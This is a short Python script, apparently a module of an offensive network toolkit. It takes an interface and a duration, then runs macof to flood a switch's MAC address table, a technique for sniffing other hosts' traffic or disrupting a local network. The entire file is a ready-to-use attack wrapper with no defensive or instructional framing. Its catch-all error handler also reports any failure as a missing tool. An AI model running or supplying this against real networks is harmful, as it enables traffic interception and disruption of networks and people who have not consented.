#!/usr/bin/env python3
# MAC Flooding Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("MAC FLOODING")
    print("="*60)
    
    interface = input("Network interface [eth0]: ").strip() or "eth0"
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    print(f"\nStarting MAC flooding on {interface}")
    print(f"Duration: {duration}s")
    print("Press Ctrl+C to stop")
    
    try:
        cmd = f"macof -i {interface}"
        print(f"Running: {cmd}")
        
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        
        print("\nMAC flooding completed!")
        
    except KeyboardInterrupt:
        print("\nStopping MAC flooding...")
        print("Done")
    except:
        print("macof not installed. Install dsniff package")
        print("sudo apt install dsniff  or  pacman -S dsniff")

if __name__ == "__main__":
    run()